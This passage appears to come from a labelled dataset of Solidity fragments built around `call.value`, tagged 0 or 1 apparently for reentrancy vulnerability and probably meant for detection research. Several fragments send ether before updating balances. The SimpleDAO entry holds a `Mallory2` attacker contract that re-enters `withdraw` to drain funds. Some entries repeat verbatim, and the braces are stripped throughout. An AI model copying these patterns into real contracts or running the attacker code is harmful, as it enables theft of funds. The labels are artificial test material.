assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
608 10715.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
1
---------------------------------
609 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
610 39191.sol
function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) {
if (self.accountBalances[accountAddress] >= value) {
deductFunds(self, accountAddress, value);
if (!accountAddress.send(value)) {
if (!accountAddress.call.value(value)()) {  throw; }
return true;
return false;
0
---------------------------------
611 14995.sol
function fund() public payable
if (dateSaleStarted==0 || now < dateSaleStarted)
return _errorBuyingTokens("CrowdSale has not yet started.");
if (now > dateSaleEnded)
return _errorBuyingTokens("CrowdSale has ended.");
if (totalRaised >= hardCap)
return _errorBuyingTokens("HardCap has been reached.");
if (msg.value % 1000000000 != 0)
return _errorBuyingTokens("Must send an even amount of GWei.");
if (!wasSaleStarted) {
wasSaleStarted = true;
emit SaleStarted(now);
uint _amtToFund = (totalRaised + msg.value) > hardCap ? hardCap - totalRaised : msg.value;
uint _numTokens = getTokensFromEth(_amtToFund);
token.mint(msg.sender, _numTokens);
totalRaised += _amtToFund;
emit BuyTokensSuccess(now, msg.sender, _amtToFund, _numTokens);
if (totalRaised < softCap) {
amtFunded[msg.sender] += _amtToFund;
uint _refund = msg.value > _amtToFund ? msg.value - _amtToFund : 0;
if (_refund > 0){
require(msg.sender.call.value(_refund)());
emit UserRefunded(now, msg.sender, _refund);
function endSale() public
require(wasSaleStarted && !wasSaleEnded);
require(totalRaised >= hardCap || now > dateSaleEnded);
wasSaleEnded = true;
wasSoftCapMet = totalRaised >= softCap;
if (!wasSoftCapMet) {
token.mint(wallet, 1e30);
emit SaleFailed(now);
return;
token.freeze(false);
uint _lockerAmt = token.totalSupply() / 4;
token.mint(locker, _lockerAmt);
locker.startVesting(_lockerAmt, 600);
uint _capitalAmt = (totalRaised * capitalPctBips) / 10000;
if (address(this).balance < _capitalAmt) _capitalAmt = address(this).balance;
treasury.addCapital.value(_capitalAmt)();
if (wallet.call.value(address(this).balance)()) {}
emit SaleSuccessful(now);
function refund() public
require(wasSaleEnded && !wasSoftCapMet);
require(amtFunded[msg.sender] > 0);
uint _amt = amtFunded[msg.sender];
amtFunded[msg.sender] = 0;
require(msg.sender.call.value(_amt)());
emit UserRefunded(now, msg.sender, _amt);
function fundCapital() public payable
if (!wasSaleEnded)
return _errorBuyingTokens("Sale has not ended.");
if (!wasSoftCapMet)
return _errorBuyingTokens("SoftCap was not met.");
uint _amtNeeded = capitalFundable();
uint _amount = msg.value > _amtNeeded ? _amtNeeded : msg.value;
if (_amount == 0) {
return _errorBuyingTokens("No capital is needed.");
totalRaised += _amount;
token.mint(msg.sender, _amount);
treasury.addCapital.value(_amount)();
emit BuyTokensSuccess(now, msg.sender, _amount, _amount);
uint _refund = msg.value > _amount ? msg.value - _amount : 0;
if (_refund > 0) {
require(msg.sender.call.value(_refund)());
emit UserRefunded(now, msg.sender, _refund);
function _errorBuyingTokens(string _reason) private
require(msg.sender.call.value(msg.value)());
emit BuyTokensFailure(now, msg.sender, _reason);
function collectOwedDividends() public returns (uint _amount)
_updateCreditedPoints(msg.sender);
_amount = creditedPoints[msg.sender] / POINTS_PER_WEI;
creditedPoints[msg.sender] = 0;
dividendsCollected += _amount;
emit CollectedDividends(now, msg.sender, _amount);
require(msg.sender.call.value(_amount)());
function collect() public
require(msg.sender == owner);
token.collectOwedDividends();
uint _amount = address(this).balance;
if (_amount > 0) require(owner.call.value(_amount)());
emit Collected(now, owner, _amount);
0
---------------------------------
612 740.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
require(_value > 0 && frozenAccount[msg.sender] == false && frozenAccount[_to] == false && now > unlockUnixTime[msg.sender]  && now > unlockUnixTime[_to]);
if (isContract(_to)) {
require(balanceOf[msg.sender] >= _value);
balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
balanceOf[_to] = balanceOf[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
613 14994.sol
function collectOwedDividends() public returns (uint _amount) {
_updateCreditedPoints(msg.sender);
_amount = creditedPoints[msg.sender] / POINTS_PER_WEI;
creditedPoints[msg.sender] = 0;
dividendsCollected += _amount;
emit CollectedDividends(now, msg.sender, _amount);
require(msg.sender.call.value(_amount)());
0
---------------------------------
614 14758.sol
function wcf(address target, uint256 a) payable {
require(msg.sender == owner);
uint startBalance = this.balance;
target.call.value(msg.value)(bytes4(keccak256("play(uint256)")), a);
if (this.balance <= startBalance) revert();
owner.transfer(this.balance);
0
---------------------------------
615 39190.sol
function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) {
if (self.accountBalances[accountAddress] >= value) {
deductFunds(self, accountAddress, value);
if (!accountAddress.send(value)) {
if (!accountAddress.call.value(value)()) {
throw;
return true;
return false;
uint constant DEFAULT_SEND_GAS = 100000;
function execute(Call storage self, uint start_gas, address executor, uint overhead, uint extraGas) public {
FutureCall call = FutureCall(this);
self.wasCalled = true;
if (self.abiSignature == EMPTY_SIGNATURE && self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)();
else if (self.abiSignature == EMPTY_SIGNATURE) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.callData);
else if (self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature);
else {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature, self.callData);
call.origin().call(bytes4(sha3("updateDefaultPayment()")));
uint gasScalar = getGasScalar(self.anchorGasPrice, tx.gasprice);
uint basePayment;
if (self.claimer == executor) {
basePayment = self.claimAmount;
else {
basePayment = call.basePayment();
uint payment = self.claimerDeposit + basePayment * gasScalar / 100;
uint donation = call.baseDonation() * gasScalar / 100;
self.claimerDeposit = 0;
uint gasCost = tx.gasprice * (start_gas - msg.gas + extraGas);
payment = sendSafe(executor, payment + gasCost);
donation = sendSafe(creator, donation);
CallExecuted(executor, gasCost, payment, donation, self.wasSuccessful);
event Cancelled(address indexed cancelled_by);
0
---------------------------------
616 21697.sol
function Jump() public payable {
if(msg.value > 1 ether)  {
msg.sender.call.value(this.balance);
0
---------------------------------
617 35806.sol
function withdraw(uint amount) {
require(tokens[0][msg.sender] >= amount);
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount);
require(msg.sender.call.value(amount)());
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
618 40241.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
619 8342.sol
function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyCommittee returns (bool) {
return _to.call.value(_value).gas(_gas)(_code);
0
---------------------------------
620 dumbDAO.sol
function withdraw(address _recipient) returns (bool) {
if (balances[msg.sender] == 0){
InsufficientFunds(balances[msg.sender],balances[msg.sender]);
throw;
PaymentCalled(_recipient, balances[msg.sender]);
if (_recipient.call.value(balances[msg.sender])()) {
balances[msg.sender] = 0;
return true;
1
---------------------------------
621 Bank.sol
function withdraw() {
require(msg.sender.call.value(balances[msg.sender])());
balances[msg.sender]=0;
contract Attacker{
address public bankAddr;
uint attackCount = 0;
constructor(address _bank){
bankAddr = _bank;
1
---------------------------------
622 40090.sol
function multiAccessCallD(address _to, uint _value, bytes _data, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _to, _value, _data)) returns(bool) {
return _to.call.value(_value)(_data);
function() returns(bool) {
return multiAccessCall(multiAccessRecipient, msg.value, msg.data);
function multiAccessCall(address _to, uint _value, bytes _data) returns(bool) {
return this.multiAccessCallD(_to, _value, _data, msg.sender);
0
---------------------------------
623 17043.sol
function withdraw() public {
msg.sender.call.value(balances[msg.sender])();
balances[msg.sender] = 0;
1
---------------------------------
624 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
625 39817.sol
function callDividend(address token_) owned {
assert(tokenManage[token_].hasDividend);
assert(tokenManage[token_].divContractAddress.call.value(0)(tokenManage[token_].divData));
function buyEther(uint256 amount) {
assert(valueToToken(etherContract,balances[msg.sender]) >= amount);
assert(destroyValue(msg.sender, tokenToValue(etherContract,amount)));
assert(msg.sender.call.value(amount)());
Buy(etherContract, msg.sender, amount, balances[msg.sender]);
function quickTrade(address tokenFrom, address tokenTo, uint256 input) payable drainBlock {
uint256 inValue;
uint256 tempInValue = safeAdd(tokenToValue(etherContract,msg.value),
tokenToValue(tokenFrom,input));
inValue = valueWithFee(tempInValue);
uint256 outValue = valueToToken(tokenTo,inValue);
assert(verifiedTransferFrom(tokenFrom,msg.sender,input));
if (tokenTo == etherContract){
assert(msg.sender.call.value(outValue)());
} else
assert(Token(tokenTo).transfer(msg.sender, outValue));
Trade(tokenFrom, tokenTo, msg.sender, inValue);
function takeEtherProfits(){
ShopKeeper(shopKeeperLocation).splitProfits();
ValueTrader shop = ValueTrader(shopLocation);
shop.buyEther(shop.balanceOf(this));
assert(profitContainerLocation.call.value(this.balance)());
0
---------------------------------
626 21241.sol
function finish() onlyOwner saleCompletedSuccessfully public {
uint256 freeEthers = address(this).balance * 40 / 100;
uint256 vestedEthers = address(this).balance - freeEthers;
address(0xd1B10607921C78D9a00529294C4b99f1bd250E1c).transfer(freeEthers);
assert(address(0x0285d35508e1A1f833142EB5211adb858Bd3323A).call.value(vestedEthers)());
AuctusToken token = AuctusToken(auctusTokenAddress);
token.setTokenSaleFinished();
if (remainingTokens > 0) {
token.burn(remainingTokens);
remainingTokens = 0;
0
---------------------------------
627 SimpleDAO.sol
function withdraw(uint amount) {
if (credit[msg.sender]>= amount) {
msg.sender.call.value(amount)();
credit[msg.sender]-=amount;
function getJackpot() {
owner.send(this.balance);
function() {
dao.withdraw(dao.queryCredit(this));
contract Mallory2 {
SimpleDAO public dao;
address owner;
bool public performAttack = true;
function attack()  {
dao.donate.value(1)(this);
dao.withdraw(1);
function getJackpot(){
dao.withdraw(dao.balance);
owner.send(this.balance);
performAttack = true;
function() {
if (performAttack) {
performAttack = false;
dao.withdraw(1);
function getJackpot(){
dao.withdraw(dao.balance);
owner.send(this.balance);
performAttack = true;
function() {
if (performAttack) {
performAttack = false;
dao.withdraw(1);
1
---------------------------------
628 32605.sol
function forward(address destination, uint value, bytes data) public onlyOwner {
require(destination.call.value(value)(data));
Forwarded(destination, value, data);
contract MetaIdentityManager {
uint adminTimeLock;
uint userTimeLock;
uint adminRate;
address relay;
event LogIdentityCreated(address indexed identity, address indexed creator, address owner, address indexed recoveryKey);
event LogOwnerAdded(address indexed identity, address indexed owner, address instigator);
event LogOwnerRemoved(address indexed identity, address indexed owner, address instigator);
event LogRecoveryChanged(address indexed identity, address indexed recoveryKey,address instigator);
event LogMigrationInitiated(address indexed identity, address indexed newIdManager, address instigator);
event LogMigrationCanceled(address indexed identity, address indexed newIdManager, address instigator);
event LogMigrationFinalized(address indexed identity, address indexed newIdManager, address instigator);
mapping(address => mapping(address => uint)) owners;
mapping(address => address) recoveryKeys;
mapping(address => mapping(address => uint)) limiter;
mapping(address => uint) public migrationInitiated;
mapping(address => address) public migrationNewAddress;
modifier onlyAuthorized() {
require(msg.sender == relay || checkMessageData(msg.sender));
modifier onlyOwner(address identity, address sender) {
require(isOwner(identity, sender));
modifier onlyOlderOwner(address identity, address sender) {
require(isOlderOwner(identity, sender));
modifier onlyRecovery(address identity, address sender) {
require(recoveryKeys[identity] == sender);
modifier rateLimited(Proxy identity, address sender) {
require(limiter[identity][sender] < (now - adminRate));
limiter[identity][sender] = now;
modifier validAddress(address addr) {
require(addr != address(0));
function createIdentityWithCall(address owner, address recoveryKey, address destination, bytes data) public validAddress(recoveryKey) {
Proxy identity = new Proxy();
owners[identity][owner] = now - adminTimeLock;
recoveryKeys[identity] = recoveryKey;
LogIdentityCreated(identity, msg.sender, owner,  recoveryKey);
identity.forward(destination, 0, data);
function forwardTo(address sender, Proxy identity, address destination, uint value, bytes data) public onlyAuthorized onlyOwner(identity, sender){
identity.forward(destination, value, data);
0
---------------------------------
629 22416.sol
function WithdrawToHolder(address _addr, uint _wei) public onlyOwner payable {
if(Holders[_addr]>0)  {
if(_addr.call.value(_wei)()){
Holders[_addr]-=_wei;
1
---------------------------------
630 9920.sol
function tryExec(address target, bytes calldata, uint value) internal returns (bool call_ret){
return target.call.value(value)(calldata);
function exec(address target, bytes calldata, uint value) internal {
if(!tryExec(target, calldata, value)) {
throw;
function tryExec( address t, bytes c ) internal returns (bool) {
return tryExec(t, c, 0);
function tryExec( address t, uint256 v ) internal returns (bool) {
bytes memory c; return tryExec(t, c, v);
0
---------------------------------
631 1403.sol
function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) {
_transfer( msg.sender, to, value, data );
if (isContract(to) ) {
ContractReceiver rx = ContractReceiver(to);
require(address(rx).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data));
return true;
function transfer(address to, uint256 value) public returns (bool success) {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
return true;
function transferFrom(address from, address to, uint256 value) public returns (bool success) {
require( value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer(from, to, value, empty);
return true;
function transfer(address to, uint value, bytes data) public returns (bool success) {
if (isContract(to)) {
return transferToContract(to, value, data);
_transfer(msg.sender, to, value, data );
return true;
function transferToContract(address to, uint value, bytes data) private returns (bool success) {
_transfer(msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
rx.tokenFallback( msg.sender, value, data );
return true;
1
---------------------------------
632 simple_dao.sol
function withdraw(uint amount) public{
if (credit[msg.sender]>= amount) {
require(msg.sender.call.value(amount)());
credit[msg.sender]-=amount;
1
---------------------------------
633 40118.sol
function withdrawEtherOrThrow(uint256 amount) private {
if (msg.sender != owner) throw;
bool result = owner.call.value(amount)();
if (!result) { throw;}
function refund() noEther onlyOwner {
if (tokenBalance == 0) throw;
tokenBalance = 0;
withdrawEtherOrThrow(tokenBalance * tokenPrice);
0
---------------------------------
634 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
635 17518.sol
function sendTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
636 21900.sol
function crowdsale() public payable returns (bool) {
require(msg.value >= limit);
uint256 vv = msg.value;
uint256 coin = crowdsalePrice.mul(vv);
require(coin.add(totalSupply) <= supplyLimit);
require(crowdsaleSupply.add(coin) <= crowdsaleTotal);
balances[msg.sender] = coin.add(balances[msg.sender]);
totalSupply = totalSupply.add(coin);
crowdsaleSupply = crowdsaleSupply.add(coin);
balances[msg.sender] = coin;
require(owner.call.value(msg.value)());
return true;
contract GGPCToken is Crowdsale {
string public name = "Global game payment currency";
string public symbol = "GGPC";
string public version = '1.0.2';
0
---------------------------------
637 14945.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
0
---------------------------------
638 33450.sol
function executeTransaction(bytes32 TransHash) public notExecuted(TransHash){
if (isConfirmed(TransHash)) {
Transactions[TransHash].executed = true;
require(Transactions[TransHash].destination.call.value(Transactions[TransHash].value)(Transactions[TransHash].data));
Execution(TransHash);
function confirmTransaction(bytes32 TransHash) public onlyOwner(){
addConfirmation(TransHash);
executeTransaction(TransHash);
0
---------------------------------
639 40469.sol
function _forward(address _to, bytes _data) internal returns(bool) {
uint startGas = msg.gas + forwardCallGas + (_data.length * 50);
if (_to == 0x0) {
return false;
_to.call.value(msg.value)(_data);
return _applyRefund(startGas);
0
---------------------------------
640 18170.sol
function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() {
require(_amount <= wingsETHRewards);
require(_contract.call.value(_amount)());
wingsETHRewards -= _amount;
0
---------------------------------
641 40092.sol
function withdrawPayments() external returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) { throw; }
success = true;
0
---------------------------------
642 4591.sol
function finishDistribution() onlyOwner canDistr public returns (bool) {
crowdsaleClosed = true;
uint256 amount = tokenReward.sub(amountRaisedIsc);
balances[beneficiary] = balances[beneficiary].add(amount);
emit Transfer(address(0), beneficiary, amount);
require(msg.sender.call.value(amountRaised)());
return true;
0
---------------------------------
643 TokenWithInvariants.sol
function withdraw() checkInvariants {
uint balance = balanceOf[msg.sender];
if (msg.sender.call.value(balance)()) {
totalSupply -= balance;
balanceOf[msg.sender] = 0;
1
---------------------------------
644 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
645 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
646 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
647 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
648 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
649 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
650 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
651 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
652 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
653 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
654 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
655 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
656 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
657 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
658 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
659 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
660 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
661 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
662 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
663 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
